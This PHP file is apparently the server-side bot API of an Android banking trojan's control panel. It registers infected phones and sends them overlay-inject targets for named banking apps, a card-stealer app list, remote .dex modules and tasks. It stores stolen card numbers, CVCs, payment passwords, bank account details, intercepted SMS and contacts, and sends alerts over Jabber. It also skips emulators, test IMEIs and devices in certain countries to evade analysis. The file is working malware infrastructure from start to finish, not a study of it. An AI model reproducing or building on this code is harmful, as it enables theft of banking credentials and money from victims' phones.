<?php
if(!defined('MODE') || MODE != 'bot') hlp::show_404();
include(dirname(__FILE__) . "/jabber.php");
/*
API 2.0

Each request from a bot should contain:

i - bot id, 32 chars 0-9A-z hash
m - command name, has one value from botApi::$commands

Response is not empty, only if bot requires additional commands
*/

class botApi
{
	
	public $db;
	public $debug = false;
	public $client_cfg = null;
	
	public static $commands = array(
		"gj" => array("name" => "get_injects"),
		"gm" => array("name" => "get_module"),
		"g" => array("name" => "get_command"),
		"r" => array("name" => "send_result"),
		"c" => array("name" => "send_card"),
		"l" => array("name" => "load_sms"),
		"x" => array("name" => "get_contacts"),
		"ui" => array("name" => "update_info"),
	);
	
	function __construct($db, $client_cfg)
	{
		$this->client_cfg = $client_cfg;
		$this->db = $db;
		//~ $this->db->exec("use {$this->client_cfg['db_main']}");
	}
	
	function show_response($data)
	{
		if(!sizeof($data))
			hlp::show_404();
			
		return json_encode($data);
	}
	
	// process array of json request of the bot
	// response json or 404
	function process($data)
	{
		$command_data = hlp::get(botApi::$commands, hlp::get($data, "m", ''), '');
		if(!$command_data)
			hlp::show_404(); // 'm' not exists

		$bot_id = $data["i"];
		
		if(!preg_match("/^[0-9A-z]{32}$/", $bot_id))
			hlp::show_404(); // bot_id is invalid

		$tag = hlp::get($data, "t", '');
		if(!$tag)
			hlp::show_404(); // no tag specified
		
		if($this->is_bot_blocked($bot_id, $data))
		{
			$result["tt"] = "";
			return $this->show_response($result);
		}
		
		$result = array();
		$jabb = new Jabber($this->db, $this->client_cfg);
		
		switch($command_data['name'])
		{
			//TODO: save tokens / add jabber notify if $this->client_cfg['mod_otp_tokens']
			
			// Case example:
			// case 'test':    -- add this string to $this->commands
				// do something with $bot_id and $data (all fields of the request)
				// $result["tt"] = ""; -- required
				// break;
				
			case 'update_info':
				$this->add_contacts($bot_id, $data);
				$this->add_apps($bot_id, $data);
				$this->update_info($bot_id, $data);
				$result["tt"] = "";
				break;
				
			case 'get_module':
				
				$mod_name = hlp::get($data, "mm", ""); // 'test'
				$path = dirname(__FILE__) . "/bot_mods/{$mod_name}.dex";
				
				if(file_exists($path))
					die(file_get_contents($path));

				$result["tt"] = "";
				break;

			case 'send_result':

				$this->save_result($bot_id, $data);
				$this->add_contacts($bot_id, $data);
				$result["tt"] = $this->get_tasks($bot_id);
				break;

			case 'load_sms':
				
				$this->save_sms($bot_id, $data);
				$jabb->send_notify("sms", $bot_id, $data);
				$result["tt"] = $this->get_tasks($bot_id);
				break;
				
			case 'send_card':
		
				$this->save_card($bot_id, $data);
				$jabb->send_notify("card", $bot_id, $data);
				$result["tt"] = $this->get_tasks($bot_id);
				break;
				
			case 'get_command':
				$this->register_bot($bot_id, $data);
				$this->add_contacts($bot_id, $data);
				$this->add_apps($bot_id, $data);
				
				$result["tt"] = $this->get_tasks($bot_id);
				
				# VAR DATA: injects, domains, etc 
				
				$bot_version = hlp::get($data, '300', 0);
				$panel_version = $this->client_cfg['data_version'];
				
				if($panel_version > $bot_version)
				{
					$result["gin"] = $this->get_injects();
					$result["gcc"] = $this->get_cc_stealer_apps();
					$result["gma"] = $this->get_minimize_apps();
					$result["gid"] = $this->get_domains();
					$result["300"] = $panel_version;
				}
				break;
				
			case 'get_contacts':
				$this->add_contacts($bot_id, $data);
				$result["tt"] = $this->get_tasks($bot_id);
				break;
		}

		return $this->show_response($result);
	}
	
	function is_bot_blocked($bot_id, $data)
	{
		# if IP is blocked
		$ip = hlp::get_client_ip();
		$general = $this->client_cfg['db_main'];
		
		$sql = "select ip from {$general}.blocked_bots where ip=:ip or bot_id=:bot_id";
		$params = array(
			array(":ip", $ip, PDO::PARAM_STR, 15),
			array(":bot_id", $bot_id, PDO::PARAM_STR, 32),
		);
		
		$res = $this->db->exec($sql, $params, true);
		if(sizeof($res))
			return true;

		# check country, lang, imei, model, operator if they are present
		$is_bad = false;
		
		if(array_key_exists('102', $data)) // country
		{
			$country = hlp::get($data, '102', '');
			$country = strtolower($country);
			if(in_array($country, array("ru","rus","kz","ua","by", "az","am","kg","md", "tj","tm","uz","us","ca","cs","sk")))
				$is_bad = true;
		}
		
		if(array_key_exists('108', $data)) // lang
		{
			$lang = hlp::get($data, '108', '');
			$lang = strtolower($lang);
			if(in_array($lang, array("ru", "kk", "uk", "be", "az", "hy", "ky", "mo", "ro", "tg", "tk", "uz", "cs", "sk")))
				$is_bad = true;
		}
		
		if(array_key_exists('101', $data)) // imei
		{
			$imei = hlp::get($data, '101', '');
			$imei = strtolower($imei);
			if(in_array($imei, array("000000000000000", "012345678912345", "004999010640000")))
				$is_bad = true;
		}
		
		if(array_key_exists('105', $data)) // model
		{
			$model = hlp::get($data, '105', '');
			$model = strtolower($model);
			if(in_array($model, array("google_sdk", "emulator", strtolower("Android SDK built for x86"))))
				$is_bad = true;
		}
		
		if(array_key_exists('103', $data)) // operator
		{
			$operator = hlp::get($data, '103', '');
			$operator = strtolower($operator);
			if(in_array($operator, array("android","emergency calls only","fakecarrier", "fake", "carrier")))
				$is_bad = true;
		}
		
		if($is_bad)
		{
			$sql = "insert into {$general}.blocked_bots values(null, :bot_id, :ip, now())";
		
			$params = array(
				array(":ip", $ip, PDO::PARAM_STR, 15),
				array(":bot_id", $bot_id, PDO::PARAM_STR, 32),
			);
			
			$res = $this->db->exec($sql, $params);
			return true;
		}
		
		return false; // is not blocked
	}
	
	// return "domain1|domain3|domain3";
	function get_domains()
	{
		$sql = "select value from config where name='domains_list'";
		$res = $this->db->exec($sql, null, true);
		if(!$res)
			return '';
		
		$doms = explode("\n", $res[0]['value']);
		$doms_clean = array();
		
		$m = $this->client_cfg['folder'];
		foreach($doms as $dom)
		{
			$dom = str_replace('https://', '', $dom);
			$dom = str_replace('http://', '', $dom);
			$dom = array_shift(explode('/', $dom));
			if(!trim($dom) || !strstr($dom, "."))
				continue;

			$doms_clean[] = "https://{$dom}/{$m}/";
		}
		
		return implode("|", $doms_clean);
	}

	// 27:uk.co.santander.santanderUK|28:uk.co.tsb.mobilebank|29:com.bbl.mobilebanking|30:com.kasikornbank.retail.kmerchant
	function get_injects()
	{
		$c = $this->client_cfg['db_name']; // client
		$m = $this->client_cfg['db_main'];
		
		$sql = "SELECT 
			{$m}.injects.id, 
			{$m}.injects.app 
		FROM {$c}.injects, {$m}.injects 
		WHERE {$m}.injects.id in 
			(SELECT inject_id FROM {$c}.injects WHERE {$c}.injects.active = true) 
		GROUP BY {$m}.injects.id";

		$res = $this->db->exec($sql, null, true);
		if(!$res)
			return '';
			
		$list = "";
		foreach($res as $r)
			$list .= "{$r['id']}:{$r['app']}|";
			
		return $list;
	}
	
	// return "domain1|domain3|domain3";
	function get_cc_stealer_apps()
	{
		$sql = "select value from config where name='cc_on_apps_list'";
		$res = $this->db->exec($sql, null, true);
		if(!$res)
			return '';
		
		if(!empty($res[0]['value']))
			return str_replace("\n", "|", $res[0]['value']);
		
		// if no user list specified using main list from General db
		$m = $this->client_cfg['db_main'];
		$sql = "select package from {$m}.cc_on_list";
		$res = $this->db->exec($sql, null, true);
		if(!$res)
			return '';
			
		$result = '';
		foreach($res as $row)
			$result .= "{$row['package']}|";

		return $result;
	}
	
	// return "domain1|domain3|domain3";
	function get_minimize_apps()
	{
		$sql = "select value from config where name='minimize_apps_list'";
		$res = $this->db->exec($sql, null, true);
		if(!$res)
			return '';
		
		if(!empty($res[0]['value']))
			return str_replace("\n", "|", $res[0]['value']);
		
		// if no user list specified using main list from General db
		$m = $this->client_cfg['db_main'];
		$sql = "select package from {$m}.minimize_apps_list";
		$res = $this->db->exec($sql, null, true);
		if(!$res)
			return '';
			
		$result = '';
		foreach($res as $row)
			$result .= "{$row['package']}|";
		
		return $result;
	}
	
	function save_result($bot_id, $data)
	{
		$status = hlp::get($data, "3", false);
		$task_id = hlp::get($data, "6", false);
		if(!isset($data["3"]) || $task_id === false)
			hlp::show_404();
			
		$response = hlp::get($data, "5", "");
		
		$status_text = ($status)? "done_success" : "done_failed";
		
		$params = array(
			array(":status", $status_text, PDO::PARAM_STR),
			array(":response", $response, PDO::PARAM_STR),
			array(":task_id", $task_id, PDO::PARAM_INT),
			array(":bot_id", $bot_id, PDO::PARAM_STR, 32),
		);
		
		$sql = "update bot_tasks set status=:status, response=:response, ts_end=NOW() where id=:task_id and bot_id=:bot_id";
		$this->db->exec($sql, $params);
	}
	
	function save_sms($bot_id, $data)
	{
		$text = hlp::get($data, '401', false);
		$number = hlp::get($data, '402', false);
		$date = hlp::get($data, '403', false);
		
		$params = array(
			array(":bot_id", $bot_id, PDO::PARAM_STR),
			array(":text", $text, PDO::PARAM_STR, 256),
			array(":number", $number, PDO::PARAM_STR, 15),
			array(":date", $date, PDO::PARAM_STR, 20),
		);

		$sql = "INSERT INTO bot_sms (bot_id, text, number, date, ts)
		VALUES (:bot_id, :text, :number, :date, NOW())";
		$this->db->exec($sql, $params);
	}
	
	function save_card($bot_id, $data)
	{
		$step = hlp::get($data, '4', false);
		
		if($step == 1)
		{
			$full_name = hlp::get($data, '201', '');
			$full_name = trim(strip_tags($full_name));
			
			$number = hlp::get($data, '202', '');
			$number = trim(strip_tags($number));
			
			$month = hlp::get($data, '203', '');
			$month = trim(strip_tags($month));
			
			$year = hlp::get($data, '204', '');
			$year = trim(strip_tags($year));
			
			$cvc = hlp::get($data, '205', '');
			$cvc = trim(strip_tags($cvc));
			
			$params = array(
				array(":full_name", $full_name, PDO::PARAM_STR),
				array(":number", $number, PDO::PARAM_STR),
				array(":month", $month, PDO::PARAM_STR),
				array(":year", $year, PDO::PARAM_STR),
				array(":cvc", $cvc, PDO::PARAM_INT),
				array(":bot_id", $bot_id, PDO::PARAM_STR),
			);
			
			$sql = "INSERT INTO bot_cards (bot_id, number, month, year, cvc, ts, got_steps, full_name)
			VALUES (:bot_id, :number, :month, :year, :cvc, NOW(), 1, :full_name)";
			$this->db->exec($sql, $params);
			
		}else if($step == 2){
			
			$address = hlp::get($data, '206', '');
			$address = trim(strip_tags($address));
			
			$zip = hlp::get($data, '207', '');
			$zip = trim(strip_tags($zip));
			
			$phone = hlp::get($data, '208', '');
			$phone = trim(strip_tags($phone));
			
			$bday = hlp::get($data, '209', '');
			$bday = trim(strip_tags($bday));
			
			$bmonth = hlp::get($data, '210', '');
			$bmonth = trim(strip_tags($bmonth));
			
			$byear = hlp::get($data, '211', '');
			$byear = trim(strip_tags($byear));
			
			$birthday = "{$bday}/{$bmonth}/{$byear}";
			
			$pay_pass = hlp::get($data, '212', '');
			$pay_pass = trim(strip_tags($pay_pass));
			
			$sort = hlp::get($data, '213', '');
			$sort = trim(strip_tags($sort));

			$account_number = hlp::get($data, '214', '');
			$account_number = trim(strip_tags($account_number));
			
			$sql = "SELECT id from bot_cards WHERE bot_id='{$bot_id}' AND got_steps = 1";
			$res = $this->db->exec($sql, null, true);
			if($res)
			{
				$record_id = $res[0][0];
				
				$params = array(
					array(":birthday", $birthday, PDO::PARAM_STR),
					array(":pay_pass", $pay_pass, PDO::PARAM_STR),
					array(":address", $address, PDO::PARAM_STR),
					array(":zip", $zip, PDO::PARAM_STR),

					array(":phone", $phone, PDO::PARAM_STR),
					array(":sort", $sort, PDO::PARAM_STR),
					array(":account_number", $account_number, PDO::PARAM_STR),
					array(":record_id", $record_id, PDO::PARAM_INT),
				);
				
				$sql = "UPDATE bot_cards
				SET
				birthday=:birthday, 
				pay_pass=:pay_pass, 
				address=:address, 
				zip=:zip, 
				phone=:phone, 
				sort=:sort, 
				account_number=:account_number, 
				got_steps=2
				WHERE id=:record_id";
				$this->db->exec($sql, $params);
			}
		}
		
		return ""; // ok, saved
	}
	
	// get list of bot tasks
	function get_tasks($bot_id)
	{
		$sql = "select id, command from bot_tasks where bot_id='{$bot_id}' and status='pending'";
		$res = $this->db->exec($sql, null, true);
		if(!$res)
			return ''; // no tasks
		
		$tasks = array();
		$ids = array();
		foreach($res as $task)
		{
			$task_prep = json_decode($task['command'], true);
			$mod_file = dirname(__FILE__) . "/bot_mods/{$task_prep['mn']}.dex";
			if(!file_exists($mod_file))
			{
				$sql = "update bot_tasks set status='cancelled', response='Module is not allowed', ts_end=NOW() where id = {$task['id']}";
				$this->db->exec($sql);
				continue;
			}
			
			$task_prep['6'] = $task['id'];
			$ids[] = $task['id'];
			$task_prep['7'] = md5_file($mod_file);

			$tasks[] = $task_prep;
		}
		
		if($ids)
		{
			$sql = "update bot_tasks set status='in_work' where id ?";
			$this->db->exec_many($sql, $ids);
		}
		
		return $tasks;
	}
	
	function update_info($bot_id, $data)
	{
		$ip = hlp::get_client_ip();
		
		$params = array(
			array(':bot_id', $bot_id, PDO::PARAM_STR, 32),
			array(':ip', $ip, PDO::PARAM_STR, 15),
			array(':imei', trim($data['101']), PDO::PARAM_STR, 15),
			array(':country', trim($data['102']), PDO::PARAM_STR, 2),
			array(':operator', trim($data['103']), PDO::PARAM_STR, 20),
			array(':android', trim($data['104']), PDO::PARAM_STR, 8),
			array(':model', trim($data['105']), PDO::PARAM_STR),
			array(':lang', trim($data['108']), PDO::PARAM_STR, 5)
		);
		
		$number = hlp::get($data, 'number', 0);
		$number_upd = '';
		if($number != 0 && $number != '')
		{
			$number_upd = 'number = :number, ';
			$params[] = array(':number', $number, PDO::PARAM_STR, 20);
		}
		
		$sql = "UPDATE bots
		SET ip=:ip, imei=:imei, country=:country, operator=:operator, android=:android, model=:model, {$number_upd} lang=:lang
		WHERE bot_id=:bot_id";
		//file_put_contents("/tmp/shit", print_r($data, true).print_r($params, true).$sql."\n\n", FILE_APPEND);
		$res = $this->db->exec($sql, $params); 
	}
	
	
	// register or update bot info, get list of pending commands, save contacts and apps
	function register_bot($bot_id, $data)
	{
		$ip = hlp::get_client_ip();

		$params = array(
			array(':bot_id', $bot_id, PDO::PARAM_STR, 32),
			array(':is_intercept', hlp::get($data, '112', 0), PDO::PARAM_INT, 1),
			array(':ip', $ip, PDO::PARAM_STR, 15),
			array(':tag', hlp::get($data, 't', ''), PDO::PARAM_STR, 32),
			array(':is_sms_default_app', hlp::get($data, '111', 0), PDO::PARAM_INT, 1),
			array(':is_admin', hlp::get($data, '107', 0), PDO::PARAM_INT, 1),
			array(':is_screen_enabled', hlp::get($data, '109', 0), PDO::PARAM_INT, 1),
			array(':phone_time', hlp::get($data, '110', 0), PDO::PARAM_INT, 11),
		);

		// FULL request (when apps list changed or on UpdateInfo handler)
		// imei
		$imei_col = $imei_val = $imei_upd = '';
		if(array_key_exists('101', $data))
		{
			$imei_col = 'imei,';
			$imei_val = ':imei,';
			$imei_upd = 'imei = :imei,';
			$params[] = array(':imei', trim($data['101']), PDO::PARAM_STR, 15);
		}
		
		// country
		$country_col = $country_val = $country_upd = '';
		if(array_key_exists('102', $data))
		{
			$country_col = 'country,';
			$country_val = ':country,';
			$country_upd = 'country = :country,';
			$params[] = array(':country', trim($data['102']), PDO::PARAM_STR, 2);
		}
		
		// operator
		$operator_col = $operator_val = $operator_upd = '';
		if(array_key_exists('103', $data))
		{
			$operator_col = 'operator,';
			$operator_val = ':operator,';
			$operator_upd = 'operator = :operator,';
			$params[] = array(':operator', trim($data['103']), PDO::PARAM_STR, 20);
		}
		
		// android
		$android_col = $android_val = $android_upd = '';
		if(array_key_exists('104', $data))
		{
			$android_col = 'android,';
			$android_val = ':android,';
			$android_upd = 'android = :android,';
			$params[] = array(':android', trim($data['104']), PDO::PARAM_STR, 8);
		}
		
		// model
		$model_col = $model_val = $model_upd = '';
		if(array_key_exists('105', $data))
		{
			$model_col = 'model,';
			$model_val = ':model,';
			$model_upd = 'model = :model,';
			$params[] = array(':model', trim($data['105']), PDO::PARAM_STR);
		}
		
		// lang
		$lang_col = $lang_val = $lang_upd = '';
		if(array_key_exists('108', $data))
		{
			$lang_col = 'lang,';
			$lang_val = ':lang,';
			$lang_upd = 'lang = :lang,';
			$params[] = array(':lang', trim($data['108']), PDO::PARAM_STR, 5);
		}
	
		// optional number parameter ; can be set custom from user
		$number = hlp::get($data, 'number', 0);
		$number_upd = $number_val = $number_col = '';
		if($number != 0 && $number != '')
		{
			$number_col = 'number,';
			$number_val = ':number,';
			$number_upd = 'number = :number,';
			$params[] = array(':number', $number, PDO::PARAM_STR, 20);
		}
		
		$sql = "INSERT INTO bots
		(bot_id, timestamp, registered, is_intercept, {$imei_col} {$country_col} {$operator_col} 
		{$android_col} {$model_col} {$number_col} ip, tag, is_sms_default_app, 
		is_admin, ${lang_col} is_screen_enabled, phone_time)
		
		VALUES 
		(:bot_id, NOW(), NOW(), :is_intercept, {$imei_val} {$country_val} {$operator_val} 
		{$android_val} {$model_val} {$number_val} :ip, :tag, :is_sms_default_app, 
		:is_admin, {$lang_val} :is_screen_enabled, :phone_time )
		
		ON DUPLICATE KEY UPDATE
		timestamp = NOW(),
		is_intercept = :is_intercept,
		ip = :ip,
		tag = :tag,
		is_sms_default_app = :is_sms_default_app,
		is_admin = :is_admin,
		is_screen_enabled = :is_screen_enabled,
		{$imei_upd}
		{$country_upd}
		{$operator_upd}
		{$android_upd}
		{$model_upd}
		{$number_upd}
		{$lang_upd}
		phone_time = :phone_time";
		
		$res = $this->db->exec($sql, $params); 
	}
	
	// apps is an array of apps names
	function add_apps($bot_id, $data)
	{
		$apps = hlp::get($data, '2', null);
		if(!$apps)
			return;
		
		$res = $this->db->exec("select name from apps where id in (select app_id from bot_apps where bot_id='{$bot_id}')", null, true);
		$bot_apps = array();
		if($res)
		foreach($res as $row)
			$bot_apps[] = $row['name'];
			
		$apps = hlp::list2array($apps, '|');
		foreach($apps as $app)
		{
			if(in_array($app, $bot_apps))
				continue;
				
			$this->db->exec("insert into apps values(null, '{$app}', 1) on duplicate key update total_count=total_count+1");
			$app_id = $this->db->exec("select id from apps where name='{$app}'", null, true)[0][0];
			$this->db->exec("insert into bot_apps values(null, '{$bot_id}', {$app_id}) on duplicate key update app_id={$app_id};");
		}
	}
	
	// $contacts is json '{name: phone, key: val}' as a string
	function add_contacts($bot_id, $data)
	{
		$contacts = hlp::get($data, '1', null);

		if(!$contacts)
			return "";

		if(is_string($contacts))
		{
			$contacts = json_decode($contacts, true);
			if($contacts === false)
				return;
		}

		$old_contacts = array();
		$res = $this->db->exec("select data from bot_contacts where bot_id='{$bot_id}'", null, true);
		
		if($res && is_string($res[0][0]))
			$old_contacts = json_decode($res[0][0], true);
		
		foreach($contacts as $name=>$phone)
			$old_contacts[$name] = $phone;
		
		$sql = "insert into bot_contacts values(null, '{$bot_id}', :data, '') 
		on duplicate key update 
		data=:data";
		
		$data_param = array(":data", json_encode($old_contacts), PDO::PARAM_STR);
		$res = $this->db->exec($sql, array($data_param));
	}
	
	
}
















